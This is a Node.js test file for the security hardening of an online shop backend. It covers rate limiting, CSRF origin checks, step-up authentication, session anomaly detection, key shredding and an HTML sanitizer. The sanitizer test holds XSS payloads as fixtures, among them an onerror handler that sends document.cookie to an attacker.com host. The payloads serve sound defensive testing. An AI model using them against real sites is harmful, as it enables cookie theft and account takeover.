'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const Module = require('node:module');

const REPO_ROOT = path.resolve(__dirname, '..');

function readRepoFile(relativePath) {
    return fs.readFileSync(path.join(REPO_ROOT, relativePath), 'utf8');
}

function createMockResponse() {
    const state = {
        statusCode: 200,
        headers: {},
        body: ''
    };

    return {
        status(code) {
            state.statusCode = code;
            return this;
        },
        setHeader(name, value) {
            state.headers[String(name).toLowerCase()] = value;
            return this;
        },
        end(payload = '') {
            state.body = String(payload || '');
            return this;
        },
        json() {
            return state.body ? JSON.parse(state.body) : {};
        },
        get statusCode() {
            return state.statusCode;
        },
        get headers() {
            return state.headers;
        }
    };
}

test('core security hardening migration enforces physical check constraints and zero-trust permissions', () => {
    const sql = readRepoFile(path.join('supabase', 'migrations', '20261107_core_security_hardening.sql'));

    // 1. Check Constraint
    assert.match(
        sql,
        /conname = 'points_balance_non_negative_check'/,
        'migration should check for non-negative balance constraint'
    );
    assert.match(
        sql,
        /CHECK\s*\(paid_balance >= 0 AND bonus_balance >= 0\)/,
        'migration should enforce paid_balance and bonus_balance non-negative check'
    );

    // 2. PostgREST Lockdown
    assert.match(
        sql,
        /REVOKE ALL ON TABLE public\.redemption_codes FROM PUBLIC, anon;/,
        'migration should revoke public and anon access on redemption_codes'
    );
    assert.match(
        sql,
        /REVOKE ALL ON TABLE public\.redemption_batches FROM PUBLIC, anon;/,
        'migration should revoke public and anon access on redemption_batches'
    );
    assert.match(
        sql,
        /REVOKE ALL ON TABLE public\.rate_limit_buckets FROM PUBLIC, anon, authenticated;/,
        'migration should isolate rate_limit_buckets to service_role'
    );

    // 3. Anti-Brute-Force Rate Limiting in fn_redeem_code
    assert.match(
        sql,
        /public\.take_rate_limit_token\(/,
        'fn_redeem_code should invoke take_rate_limit_token for anti-brute-force defense'
    );
    assert.match(
        sql,
        /'redeem:user:' \|\| v_user_id::text/,
        'fn_redeem_code should key rate limits by user ID'
    );
    assert.match(
        sql,
        /'rate_limited'/,
        'fn_redeem_code should return a rate_limited error code when threshold is exceeded'
    );

    // 4. CDK Crypto-Shredding Routine
    assert.match(
        sql,
        /CREATE OR REPLACE FUNCTION public\.fn_shred_expired_cdks\(/,
        'migration should define fn_shred_expired_cdks routine'
    );
    assert.match(
        sql,
        /ciphertext = 'SHREDDED'/,
        'shredding routine should overwrite ciphertext with SHREDDED marker'
    );
    assert.match(
        sql,
        /auth\.role\(\), ''\) <> 'service_role'/,
        'shredding routine should strictly verify service_role authorization'
    );
});

test('shop-cdk-secrets safely recognizes SHREDDED cards with dedicated error code', () => {
    const { decryptCdk } = require('../api/_lib/shop-cdk-secrets');

    const shreddedPayload = {
        version: 1,
        algorithm: 'aes-256-gcm',
        nonce: 'SHREDDED',
        ciphertext: 'SHREDDED',
        auth_tag: 'SHREDDED'
    };

    assert.throws(
        () => {
            decryptCdk(shreddedPayload, {
                inventoryId: '11111111-1111-4111-8111-111111111111',
                site: 'cn',
                env: {
                    SHOP_CDK_ENCRYPTION_KEY: 'test-seed-for-encryption-key-12345',
                    SHOP_CDK_HMAC_PEPPER: 'test-pepper-12345'
                }
            });
        },
        (error) => {
            assert.equal(error.code, 'shop_cdk_shredded');
            assert.match(error.message, /碎纸化/);
            return true;
        }
    );
});

test('shop purchase handler trips global circuit breaker when surge threshold is reached', async () => {
    const handlerPath = path.resolve(__dirname, '../api/shop/purchase.js');
    const sharedHandlerPath = path.resolve(__dirname, '../server/api-handlers/public/shop.js');
    const originalLoad = Module._load;

    const rateLimitCalls = [];
    const mockAdmin = {
        getOptionalSupabaseAdmin() {
            return null;
        },
        async parseJsonBody() {
            return {
                productId: 'product-safe-1',
                quantity: 1,
                site: 'cn'
            };
        },
        async requireAuthenticatedUser() {
            return {
                user: { id: 'test-user-circuit-breaker-1' },
                token: 'valid-test-token',
                supabase: null,
                requestSupabase: null,
                adminSupabase: null
            };
        },
        sendJson(res, statusCode, payload) {
            return res.status(statusCode).end(JSON.stringify(payload));
        },
        setPrivateApiCache() {}
    };

    const mockRequestSecurity = {
        resolveClientIp() {
            return '192.0.2.100';
        },
        takeRateLimitToken(options = {}) {
            rateLimitCalls.push(options.key);
            if (options.key === 'shop-purchase:global-safety-breaker') {
                return {
                    allowed: false,
                    limit: 50,
                    remaining: 0,
                    resetAt: Date.now() + 30_000,
                    retryAfterSeconds: 30
                };
            }
            return {
                allowed: true,
                limit: 10,
                remaining: 9,
                resetAt: Date.now() + 60_000,
                retryAfterSeconds: 60
            };
        },
        applyRateLimitHeaders() {}
    };

    const previousGlobalMax = process.env.SHOP_PURCHASE_GLOBAL_RATE_LIMIT_MAX;
    process.env.SHOP_PURCHASE_GLOBAL_RATE_LIMIT_MAX = '50';

    Module._load = function hookedLoad(request, parent, isMain) {
        if (request === '../_lib/admin' || request.endsWith('/_lib/admin')) {
            return mockAdmin;
        }
        if (request === '../_lib/request-security' || request.endsWith('/_lib/request-security')) {
            return mockRequestSecurity;
        }
        return originalLoad.apply(this, arguments);
    };

    try {
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
        const purchaseHandler = require(handlerPath);

        const req = {
            method: 'POST',
            headers: {
                'x-forwarded-for': '192.0.2.100'
            }
        };
        const res = createMockResponse();

        await purchaseHandler(req, res);

        assert.equal(res.statusCode, 429);
        const body = res.json();
        assert.equal(body.success, false);
        assert.equal(body.code, 'global_rate_limited');
        assert.match(body.message, /系统防护已触发/);
        assert.ok(rateLimitCalls.includes('shop-purchase:global-safety-breaker'));
    } finally {
        Module._load = originalLoad;
        if (previousGlobalMax !== undefined) {
            process.env.SHOP_PURCHASE_GLOBAL_RATE_LIMIT_MAX = previousGlobalMax;
        } else {
            delete process.env.SHOP_PURCHASE_GLOBAL_RATE_LIMIT_MAX;
        }
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
    }
});

test('scripts/shred-expired-cdks correctly parses CLI arguments and runs dry-run probe', async () => {
    const { parseArgs, runShredder } = require('../scripts/shred-expired-cdks');

    const parsed = parseArgs(['--days', '14', '--batch', '50', '--dry-run']);
    assert.deepEqual(parsed, {
        retentionDays: 14,
        batchSize: 50,
        dryRun: true,
        maxBatches: 20
    });

    const mockDatabase = {
        from(tableName) {
            assert.equal(tableName, 'shop_cdk_secrets');
            return {
                select() {
                    return this;
                },
                not() {
                    return this;
                },
                lt() {
                    return this;
                },
                neq() {
                    return Promise.resolve({
                        count: 42,
                        error: null
                    });
                }
            };
        }
    };

    const result = await runShredder({
        argv: ['--days', '7', '--dry-run'],
        env: {
            SUPABASE_URL: 'https://test-supabase.co',
            SUPABASE_SERVICE_ROLE_KEY: 'test-service-key'
        },
        databaseFactory: () => mockDatabase
    });

    assert.equal(result.success, true);
    assert.equal(result.dryRun, true);
    assert.equal(result.candidateCount, 42);
    assert.equal(result.retentionDays, 7);
});

test('shop purchase handler blocks blacklisted IPs before authentication', async () => {
    const handlerPath = path.resolve(__dirname, '../api/shop/purchase.js');
    const sharedHandlerPath = path.resolve(__dirname, '../server/api-handlers/public/shop.js');
    const originalLoad = Module._load;

    const mockAdmin = {
        getOptionalSupabaseAdmin() {
            return {
                async rpc(fnName, params) {
                    if (fnName === 'check_ip_blacklisted') {
                        if (params.client_ip === '198.51.100.99') {
                            return {
                                data: {
                                    blocked: true,
                                    reason: 'Malicious scraper'
                                },
                                error: null
                            };
                        }
                    }
                    return { data: { blocked: false }, error: null };
                }
            };
        },
        async parseJsonBody() {
            return {};
        },
        async requireAuthenticatedUser() {
            throw new Error('Should not reach auth for blacklisted IP');
        },
        sendJson(res, statusCode, payload) {
            return res.status(statusCode).end(JSON.stringify(payload));
        },
        setPrivateApiCache() {}
    };

    const mockRequestSecurity = {
        resolveClientIp() {
            return '198.51.100.99';
        },
        takeRateLimitToken() {
            return { allowed: true, limit: 10, remaining: 9, resetAt: Date.now() + 60000, retryAfterSeconds: 60 };
        },
        applyRateLimitHeaders() {}
    };

    Module._load = function hookedLoad(request, parent, isMain) {
        if (request === '../_lib/admin' || request.endsWith('/_lib/admin')) {
            return mockAdmin;
        }
        if (request === '../_lib/request-security' || request.endsWith('/_lib/request-security')) {
            return mockRequestSecurity;
        }
        return originalLoad.apply(this, arguments);
    };

    process.env.ENABLE_PURCHASE_IP_BLOCKLIST_CHECK = 'true';
    try {
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
        const purchaseHandler = require(handlerPath);

        const req = {
            method: 'POST',
            headers: {
                'x-forwarded-for': '198.51.100.99'
            }
        };
        const res = createMockResponse();

        await purchaseHandler(req, res);

        assert.equal(res.statusCode, 403);
        const body = res.json();
        assert.equal(body.success, false);
        assert.equal(body.code, 'ip_blocked');
        assert.match(body.message, /IP 地址受限/);
    } finally {
        delete process.env.ENABLE_PURCHASE_IP_BLOCKLIST_CHECK;
        Module._load = originalLoad;
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
    }
});

test('input-sanitizer defangs dangerous HTML, scripts, and javascript: protocols', () => {
    const {
        stripDangerousTags,
        sanitizeUrlForDisplay,
        sanitizeTicketDescription
    } = require('../api/_lib/input-sanitizer');

    // 1. Script tag injection
    const dirtyScript = 'Hello <script>alert("XSS")</script> World';
    assert.equal(stripDangerousTags(dirtyScript), 'Hello  World');

    // 2. Nested script bypass (<scr<script>ipt>)
    const nestedScript = 'Hello <scr<script>ipt>alert(1)</script> World';
    const cleanedNested = stripDangerousTags(nestedScript);
    assert.doesNotMatch(cleanedNested, /<script/i);
    assert.doesNotMatch(cleanedNested, /<\/script>/i);

    // 3. Dangerous event handlers
    const dirtyImg = '<img src="x" onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">';
    assert.equal(stripDangerousTags(dirtyImg), '<img src="x">');

    // 4. Iframe / Object / Form injection
    const dirtyIframe = '<iframe src="javascript:alert(1)"></iframe><form action="http://evil.com"><input></form>';
    assert.equal(stripDangerousTags(dirtyIframe), '');

    // 5. Dangerous protocols
    assert.equal(sanitizeUrlForDisplay('javascript:alert(document.cookie)'), '');
    assert.equal(sanitizeUrlForDisplay('vbscript:msgbox(1)'), '');
    assert.equal(sanitizeUrlForDisplay('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='), '');
    assert.equal(sanitizeUrlForDisplay('https://example.com/avatar.png'), 'https://example.com/avatar.png');
    assert.equal(sanitizeUrlForDisplay('http://cdn.zaoyoe.com/image.jpg'), 'http://cdn.zaoyoe.com/image.jpg');

    // 6. Ticket description sanitization
    const ticketPayload = '订单出错了 <script>stealTokens()</script> <img src=1 onerror=alert(1)> 请协助处理';
    const cleanTicket = sanitizeTicketDescription(ticketPayload);
    assert.doesNotMatch(cleanTicket, /<script>/i);
    assert.doesNotMatch(cleanTicket, /onerror/i);
    assert.match(cleanTicket, /订单出错了/);
    assert.match(cleanTicket, /请协助处理/);
});

test('shop purchase handler enforces step-up authentication on high-value purchases', async () => {
    const handlerPath = path.resolve(__dirname, '../api/shop/purchase.js');
    const sharedHandlerPath = path.resolve(__dirname, '../server/api-handlers/public/shop.js');
    const originalLoad = Module._load;

    const mockAdmin = {
        getOptionalSupabaseAdmin() {
            return null;
        },
        async parseJsonBody(req) {
            return req.body || {};
        },
        async requireAuthenticatedUser() {
            return {
                user: { id: 'test-user-step-up', email: 'user@example.com' },
                token: 'mock-token',
                supabase: null,
                requestSupabase: {
                    auth: {
                        async signInWithPassword({ password }) {
                            if (password === 'CorrectPassword123!') {
                                return { data: {}, error: null };
                            }
                            return { data: null, error: new Error('Invalid login credentials') };
                        }
                    }
                },
                adminSupabase: null
            };
        },
        sendJson(res, statusCode, payload) {
            return res.status(statusCode).end(JSON.stringify(payload));
        },
        setPrivateApiCache() {}
    };

    const mockRequestSecurity = {
        resolveClientIp() {
            return '203.0.113.88';
        },
        takeRateLimitToken() {
            return { allowed: true, limit: 10, remaining: 9, resetAt: Date.now() + 60000, retryAfterSeconds: 60 };
        },
        applyRateLimitHeaders() {}
    };

    Module._load = function hookedLoad(request, parent, isMain) {
        if (request === '../_lib/admin' || request.endsWith('/_lib/admin')) {
            return mockAdmin;
        }
        if (request === '../_lib/request-security' || request.endsWith('/_lib/request-security')) {
            return mockRequestSecurity;
        }
        return originalLoad.apply(this, arguments);
    };

    mockAdmin.createSupabasePasswordVerificationClient = () => ({ auth: {
        async signInWithPassword({ password }) {
            return password === 'CorrectPassword123!'
                ? { data: { user: { id: 'test-user-step-up' } }, error: null }
                : { data: null, error: { code: 'invalid_credentials' } };
        }
    } });
    process.env.ENABLE_HIGH_VALUE_STEP_UP_VERIFICATION = 'true';
    process.env.SHOP_HIGH_VALUE_THRESHOLD_QUANTITY = '5';

    try {
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
        const purchaseHandler = require(handlerPath);

        // Case 1: High quantity without confirmation -> blocked with 403 step_up_confirmation_required
        const req1 = {
            method: 'POST',
            headers: { 'x-forwarded-for': '203.0.113.88' },
            body: {
                productId: 'product-high-value-1',
                quantity: 10,
                site: 'cn'
            }
        };
        const res1 = createMockResponse();
        await purchaseHandler(req1, res1);
        assert.equal(res1.statusCode, 403);
        const body1 = res1.json();
        assert.equal(body1.code, 'step_up_confirmation_required');
        assert.equal(body1.requiresConfirmation, true);

        // Case 2: High quantity with invalid password -> rejected with 401 step_up_password_invalid
        const req2 = {
            method: 'POST',
            headers: { 'x-forwarded-for': '203.0.113.88' },
            body: {
                productId: 'product-high-value-1',
                quantity: 10,
                site: 'cn',
                confirmPassword: 'WrongPassword!'
            }
        };
        const res2 = createMockResponse();
        await purchaseHandler(req2, res2);
        assert.equal(res2.statusCode, 401);
        const body2 = res2.json();
        assert.equal(body2.code, 'step_up_password_invalid');

    } finally {
        delete process.env.ENABLE_HIGH_VALUE_STEP_UP_VERIFICATION;
        delete process.env.SHOP_HIGH_VALUE_THRESHOLD_QUANTITY;
        Module._load = originalLoad;
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
    }
});

test('request-security resolveClientCountry normalizes and validates geographic country headers', () => {
    const { resolveClientCountry } = require('../api/_lib/request-security');

    assert.equal(resolveClientCountry({ headers: { 'cf-ipcountry': 'cn' } }), 'CN');
    assert.equal(resolveClientCountry({ headers: { 'x-vercel-ip-country': 'US' } }), 'US');
    assert.equal(resolveClientCountry({ headers: { 'cloudfront-viewer-country': 'hk' } }), 'HK');
    assert.equal(resolveClientCountry({ headers: { 'cf-ipcountry': 'INVALID_TOOLONG' } }), '');
    assert.equal(resolveClientCountry({ headers: {} }), '');
    assert.equal(resolveClientCountry(null), '');
});

test('request-security isAllowedRequestOrigin strictly validates managed sites and blocks unauthorized origins', () => {
    const { isAllowedRequestOrigin } = require('../api/_lib/request-security');

    // 1. Authorized origins
    const allowedCases = [
        'https://www.fatherkey.com',
        'https://fatherkey.com',
        'https://tg.fatherkey.com',
        'https://verify-api.fatherkey.com',
        'https://zaoyoe.com',
        'https://www.zaoyoe.com',
        'https://zaoyoe.xyz',
        'https://new.zaoyoe.xyz'
    ];

    for (const origin of allowedCases) {
        const result = isAllowedRequestOrigin({ headers: { origin } });
        assert.equal(result.allowed, true, `Expected ${origin} to be allowed`);
    }

    // 2. Unauthorized & Spoofed origins
    const blockedCases = [
        'https://evil.com',
        'https://attacker-fatherkey.com',
        'https://fatherkey.com.evil.com',
        'https://zaoyoe.com.hacker.net',
        'http://phishing.org'
    ];

    for (const origin of blockedCases) {
        const result = isAllowedRequestOrigin({ headers: { origin } });
        assert.equal(result.allowed, false, `Expected ${origin} to be blocked`);
        assert.equal(result.reason, 'unauthorized_origin');
    }

    // 3. Referer fallback
    const refererResult = isAllowedRequestOrigin({
        headers: { referer: 'https://www.fatherkey.com/shop/details?id=1' }
    });
    assert.equal(refererResult.allowed, true);
    assert.equal(refererResult.origin, 'https://www.fatherkey.com');

    // 4. Missing origin behavior
    const missingStrict = isAllowedRequestOrigin({ headers: {} }, { allowMissingOrigin: false });
    assert.equal(missingStrict.allowed, false);
    assert.equal(missingStrict.reason, 'missing_origin');

    const missingPermissive = isAllowedRequestOrigin({ headers: {} }, { allowMissingOrigin: true });
    assert.equal(missingPermissive.allowed, true);
    assert.equal(missingPermissive.isMissing, true);

    // 5. Localhost environment awareness
    const localDev = isAllowedRequestOrigin(
        { headers: { origin: 'http://localhost:3000' } },
        { env: { VERCEL_ENV: 'preview' } }
    );
    assert.equal(localDev.allowed, true);

    const localProd = isAllowedRequestOrigin(
        { headers: { origin: 'http://localhost:3000' } },
        { env: { VERCEL_ENV: 'production' } }
    );
    assert.equal(localProd.allowed, false);
    assert.equal(localProd.reason, 'localhost_forbidden_in_production');
});

test('shop purchase handler blocks CSRF attack origin when ENABLE_CSRF_PROTECTION is active', async () => {
    const handlerPath = path.resolve(__dirname, '../api/shop/purchase.js');
    const sharedHandlerPath = path.resolve(__dirname, '../server/api-handlers/public/shop.js');
    const originalLoad = Module._load;

    const mockAdmin = {
        getOptionalSupabaseAdmin() {
            return null;
        },
        async parseJsonBody() {
            return {
                productId: 'product-safe-1',
                quantity: 1,
                site: 'cn'
            };
        },
        requireAuthenticatedUser: async () => ({
            supabase: null,
            user: { id: 'user-csrf-target-1' }
        }),
        sendJson(res, statusCode, body) {
            res.status(statusCode).end(JSON.stringify(body));
            return res;
        }
    };

    const mockRequestSecurity = {
        resolveClientIp: () => '203.0.113.19',
        takeRateLimitToken: async () => ({ allowed: true, limit: 10, remaining: 9 }),
        applyRateLimitHeaders: () => {}
    };

    const realRequestSecurity = require('../api/_lib/request-security');

    Module._load = function hookedLoad(request, parent, isMain) {
        if (request === '../_lib/admin' || request.endsWith('/_lib/admin')) {
            return mockAdmin;
        }
        if (request === '../_lib/request-security' || request.endsWith('/_lib/request-security')) {
            return {
                ...realRequestSecurity,
                ...mockRequestSecurity
            };
        }
        return originalLoad.call(this, request, parent, isMain);
    };

    process.env.ENABLE_CSRF_PROTECTION = 'true';

    try {
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
        const purchaseHandler = require(handlerPath);

        // Case 1: Malicious origin -> 403 csrf_origin_rejected
        const evilReq = {
            method: 'POST',
            headers: {
                origin: 'https://evil-cross-site-stealer.com',
                'x-forwarded-for': '203.0.113.19'
            },
            body: {
                productId: 'product-safe-1',
                quantity: 1,
                site: 'cn'
            }
        };
        const evilRes = createMockResponse();
        await purchaseHandler(evilReq, evilRes);
        assert.equal(evilRes.statusCode, 403);
        const evilBody = evilRes.json();
        assert.equal(evilBody.code, 'csrf_origin_rejected');

        // Case 2: Legitimate origin -> passes CSRF check (and reaches next step)
        const validReq = {
            method: 'POST',
            headers: {
                origin: 'https://www.fatherkey.com',
                'x-forwarded-for': '203.0.113.19'
            },
            body: {
                productId: 'product-safe-1',
                quantity: 1,
                site: 'cn'
            }
        };
        const validRes = createMockResponse();
        await purchaseHandler(validReq, validRes);
        // It must NOT be rejected by CSRF!
        assert.notEqual(validRes.statusCode, 403);
    } finally {
        delete process.env.ENABLE_CSRF_PROTECTION;
        Module._load = originalLoad;
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
    }
});

test('scripts/audit-db-security runner detects unprotected tables and zero-trust leaks', async () => {
    const { runDbSecurityAudit } = require('../scripts/audit-db-security');

    // Case 1: Database has an unprotected table without RLS
    const mockAdminVulnerable = {
        async rpc(func) {
            if (func === 'fn_audit_db_security') {
                return {
                    data: [
                        { table_name: 'shop_products', rls_enabled: true, rls_forced: true, has_anon_access: true, status: 'OK' },
                        { table_name: 'points_balance', rls_enabled: false, rls_forced: false, has_anon_access: true, status: 'RLS_DISABLED_CRITICAL' }
                    ],
                    error: null
                };
            }
            return { data: null, error: new Error('unknown function') };
        }
    };

    const vulnReport = await runDbSecurityAudit({
        env: { SUPABASE_URL: 'https://test.supabase.co', SUPABASE_SERVICE_ROLE_KEY: 'test-key' },
        adminSupabase: mockAdminVulnerable
    });

    assert.equal(vulnReport.passed, false);
    assert.equal(vulnReport.summary.rlsDisabledCount, 1);
    assert.ok(vulnReport.violations.some((v) => v.type === 'rls_disabled' && v.table === 'points_balance'));

    // Case 2: Anon client is able to leak data from sensitive tables
    const { SENSITIVE_TABLES, PURCHASE_FUNCTIONS } = require('../scripts/audit-db-security');
    const mockAdminSecure = {
        async rpc(name) {
            return { data: name === 'fn_audit_db_security'
                ? SENSITIVE_TABLES.map(table_name => ({ table_name, rls_enabled: true,
                    rls_forced: true, has_anon_access: false, status: 'OK' }))
                : PURCHASE_FUNCTIONS.map(function_name => ({ function_name, signature: `${function_name}(uuid)`,
                    anon_execute: false, authenticated_execute: false, service_execute: true })), error: null };
        }
    };

    const mockAnonLeaker = {
        from(table) {
            return {
                select() {
                    return {
                        limit: async () => {
                            if (table === 'shop_cdk_secrets') {
                                return { data: [{ inventory_id: 'secret-123' }], error: null };
                            }
                            return { data: [], error: null };
                        }
                    };
                }
            };
        }
    };

    const leakReport = await runDbSecurityAudit({
        env: { SUPABASE_URL: 'https://test.supabase.co', SUPABASE_SERVICE_ROLE_KEY: 'test-key', SUPABASE_ANON_KEY: 'anon-key' },
        adminSupabase: mockAdminSecure,
        anonSupabase: mockAnonLeaker
    });

    assert.equal(leakReport.passed, false);
    assert.equal(leakReport.summary.penetrationFailures, 1);
    assert.ok(leakReport.violations.some((v) => v.type === 'penetration_leak' && v.table === 'shop_cdk_secrets'));

    // Case 3: Completely secure database
    const mockAnonBlocked = {
        from() {
            return {
                select() {
                    return {
                        limit: async () => ({ data: null, error: { code: '42501', message: 'permission denied' } })
                    };
                }
            };
        }
    };

    const secureReport = await runDbSecurityAudit({
        env: { SUPABASE_URL: 'https://test.supabase.co', SUPABASE_SERVICE_ROLE_KEY: 'test-key', SUPABASE_ANON_KEY: 'anon-key' },
        adminSupabase: mockAdminSecure,
        anonSupabase: mockAnonBlocked
    });

    assert.equal(secureReport.passed, true);
    assert.equal(secureReport.summary.rlsDisabledCount, 0);
    assert.equal(secureReport.summary.penetrationFailures, 0);
    assert.equal(secureReport.violations.length, 0);
});

test('session-security detects impossible travel, bot tool switching, and concurrent IP anomalies', () => {
    const {
        detectSessionAnomaly,
        recordSessionReauthentication,
        clearSessionStoreForTest
    } = require('../api/_lib/session-security');

    clearSessionStoreForTest();

    const user = { id: 'user-fingerprint-test-1' };
    const t0 = 1700000000000;
    // Model an authenticated local ingress; a bare XFF header is not a peer.
    const env = { TRUSTED_PROXY_IPS: '127.0.0.1' };

    // 1. Initial normal login request from China (Shanghai) via Chrome
    const req1 = {
        socket: { remoteAddress: '127.0.0.1' },
        headers: {
            'x-forwarded-for': '114.80.12.34',
            'cf-ipcountry': 'CN',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        }
    };
    const res1 = detectSessionAnomaly(req1, user, { now: t0, env });
    assert.equal(res1.anomalyDetected, false);
    assert.equal(res1.reason, 'baseline_created');

    // 2. Impossible Travel: 15 seconds later, same token used from US (New York)
    const req2 = {
        socket: { remoteAddress: '127.0.0.1' },
        headers: {
            'x-forwarded-for': '198.51.100.22',
            'cf-ipcountry': 'US',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        }
    };
    const res2 = detectSessionAnomaly(req2, user, { now: t0 + 15000, env });
    assert.equal(res2.anomalyDetected, true);
    assert.equal(res2.anomalyType, 'impossible_travel');
    assert.ok(res2.riskScore >= 80);

    // 3. Automated Tool Switch: Same token used by python-requests scraper
    clearSessionStoreForTest();
    detectSessionAnomaly(req1, user, { now: t0, env });
    const req3 = {
        socket: { remoteAddress: '127.0.0.1' },
        headers: {
            'x-forwarded-for': '114.80.12.34',
            'cf-ipcountry': 'CN',
            'user-agent': 'python-requests/2.31.0'
        }
    };
    const res3 = detectSessionAnomaly(req3, user, { now: t0 + 10000, env });
    assert.equal(res3.anomalyDetected, true);
    assert.equal(res3.anomalyType, 'automated_tool_agent_switch');
    assert.ok(res3.riskScore >= 90);

    // 4. Concurrent IP Mismatch: Same token used from a completely different subnet within 20s
    clearSessionStoreForTest();
    detectSessionAnomaly(req1, user, { now: t0, env });
    const req4 = {
        socket: { remoteAddress: '127.0.0.1' },
        headers: {
            'x-forwarded-for': '218.1.55.99',
            'cf-ipcountry': 'CN',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        }
    };
    const res4 = detectSessionAnomaly(req4, user, { now: t0 + 20000, env });
    assert.equal(res4.anomalyDetected, true);
    assert.equal(res4.anomalyType, 'concurrent_ip_mismatch');

    // 5. Reauthentication resets the baseline
    recordSessionReauthentication(user.id, {
        clientIp: '198.51.100.22',
        country: 'US',
        uaHash: 'newhash123',
        ipPrefix: '198.51.100'
    }, { now: t0 + 30000 });

    const res5 = detectSessionAnomaly(req2, user, { now: t0 + 35000, env });
    assert.equal(res5.anomalyDetected, false);
});

test('shop purchase handler defends against stolen tokens via session anomaly gate and enforces step-up', async () => {
    const handlerPath = path.resolve(__dirname, '../api/shop/purchase.js');
    const sharedHandlerPath = path.resolve(__dirname, '../server/api-handlers/public/shop.js');
    const sessionSecurity = require('../api/_lib/session-security');
    sessionSecurity.clearSessionStoreForTest();

    const originalLoad = Module._load;

    const mockAdmin = {
        getOptionalSupabaseAdmin() {
            return null;
        },
        async parseJsonBody(req) {
            return req.body || {
                productId: 'product-safe-1',
                quantity: 1,
                site: 'cn'
            };
        },
        requireAuthenticatedUser: async () => ({
            supabase: null,
            user: { id: 'user-stolen-token-victim', email: 'victim@example.com' },
            requestSupabase: {
                auth: {
                    signInWithPassword: async ({ password }) => {
                        if (password === 'VictimRealPassword123!') {
                            return { data: { user: { id: 'user-stolen-token-victim' } }, error: null };
                        }
                        return { data: null, error: new Error('Invalid login credentials') };
                    }
                }
            }
        }),
        sendJson(res, statusCode, body) {
            res.status(statusCode).end(JSON.stringify(body));
            return res;
        }
    };

    const mockRequestSecurity = {
        resolveClientIp: (req) => req.headers?.['x-forwarded-for'] || '114.80.12.34',
        resolveClientCountry: (req) => req.headers?.['cf-ipcountry'] || 'CN',
        takeRateLimitToken: async () => ({ allowed: true, limit: 10, remaining: 9 }),
        applyRateLimitHeaders: () => {}
    };

    const realRequestSecurity = require('../api/_lib/request-security');

    Module._load = function hookedLoad(request, parent, isMain) {
        if (request === '../_lib/admin' || request.endsWith('/_lib/admin')) {
            return mockAdmin;
        }
        if (request === '../_lib/request-security' || request.endsWith('/_lib/request-security')) {
            return {
                ...realRequestSecurity,
                ...mockRequestSecurity
            };
        }
        return originalLoad.call(this, request, parent, isMain);
    };

    mockAdmin.createSupabasePasswordVerificationClient = () => ({ auth: {
        signInWithPassword: async ({ password }) => password === 'VictimRealPassword123!'
            ? { data: { user: { id: 'user-stolen-token-victim' } }, error: null }
            : { data: null, error: { code: 'invalid_credentials' } }
    } });
    process.env.ENABLE_SESSION_ANOMALY_DETECTION = 'true';

    try {
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
        const purchaseHandler = require(handlerPath);

        const victimUserId = 'user-stolen-token-victim';

        // 1. Legitimate user established baseline in China (Chrome browser)
        sessionSecurity.detectSessionAnomaly({
            headers: {
                'x-forwarded-for': '114.80.12.34',
                'cf-ipcountry': 'CN',
                'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120'
            }
        }, { id: victimUserId });

        // 2. Attacker steals token and tries to purchase from overseas IP (US) via Python script
        const attackReq = {
            method: 'POST',
            headers: {
                'x-forwarded-for': '198.51.100.99',
                'cf-ipcountry': 'US',
                'user-agent': 'python-requests/2.31.0'
            },
            body: {
                productId: 'product-safe-1',
                quantity: 1,
                site: 'cn'
            }
        };
        const attackRes = createMockResponse();
        await purchaseHandler(attackReq, attackRes);

        // Expect: 403 Forbidden with session_anomaly_detected
        assert.equal(attackRes.statusCode, 403);
        const attackBody = attackRes.json();
        assert.equal(attackBody.code, 'session_anomaly_detected');
        assert.equal(attackBody.requiresConfirmation, true);

        // 3. Attacker tries guessing a wrong password -> 401 step_up_password_invalid
        attackReq.body.confirmPassword = 'HackerGuessedWrongPassword!';
        const attackRes2 = createMockResponse();
        await purchaseHandler(attackReq, attackRes2);
        assert.equal(attackRes2.statusCode, 401);
        const attackBody2 = attackRes2.json();
        assert.equal(attackBody2.code, 'step_up_password_invalid');

        // 4. Legitimate user with correct password -> passes through and baseline is reset
        attackReq.body.confirmPassword = 'VictimRealPassword123!';
        const legitimateRes = createMockResponse();
        await purchaseHandler(attackReq, legitimateRes);
        // Should pass the anomaly step-up gate and reach catalog check
        assert.notEqual(legitimateRes.statusCode, 403);
        assert.notEqual(legitimateRes.statusCode, 401);

    } finally {
        delete process.env.ENABLE_SESSION_ANOMALY_DETECTION;
        Module._load = originalLoad;
        delete require.cache[handlerPath];
        delete require.cache[sharedHandlerPath];
        sessionSecurity.clearSessionStoreForTest();
    }
});

test('kvm4 automated security maintenance systemd artifacts and installer contract', () => {
    const { execFileSync } = require('node:child_process');
    const artifactDir = path.resolve(__dirname, '../deploy/kvm4/security-maintenance');

    // 1. Service & Timer structure checks
    const shredderService = fs.readFileSync(path.join(artifactDir, 'zaoyoe-cdk-shredder.service'), 'utf8');
    const shredderTimer = fs.readFileSync(path.join(artifactDir, 'zaoyoe-cdk-shredder.timer'), 'utf8');
    const auditService = fs.readFileSync(path.join(artifactDir, 'zaoyoe-db-security-audit.service'), 'utf8');
    const auditTimer = fs.readFileSync(path.join(artifactDir, 'zaoyoe-db-security-audit.timer'), 'utf8');

